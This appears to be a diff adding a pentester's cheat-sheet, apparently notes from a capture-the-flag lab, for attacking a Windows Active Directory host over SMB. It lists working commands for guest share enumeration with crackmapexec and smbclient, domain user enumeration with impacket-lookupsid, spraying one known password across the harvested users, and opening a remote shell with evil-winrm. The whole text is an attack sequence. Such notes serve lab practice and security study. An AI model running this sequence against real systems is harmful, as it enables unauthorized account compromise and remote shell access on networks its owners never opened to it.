@@ -1,1 +1,11 @@
+echo "10.10.11.35 ip/host" | sudo tee -a /etc/hosts
+crackmapexec smb IP --shares
+crackmapexec smb IP -u 'guest' -p '' --shares // avaliable shares in host
+smbclient //IP/DIR
+smbclient //IP/DIR -U user // ftp-like smb : get,ls/dir,put
+impacket-lookupsid 'IP/guest'@IP -no-pass // users in AD
+impacket-lookupsid 'IP/guest'@IP -no-pass | grep 'something'| sed 's/.*\\\(.*\) (something)/\1/' > users.txt
+//^ write founded users into file users.txt
+crackmapexec smb IP -u users.txt -p 'password' // brute-force users by knowing a password
+evil-winrm -u username -p 'password' -i IP // getting a shell with user priveleges
 
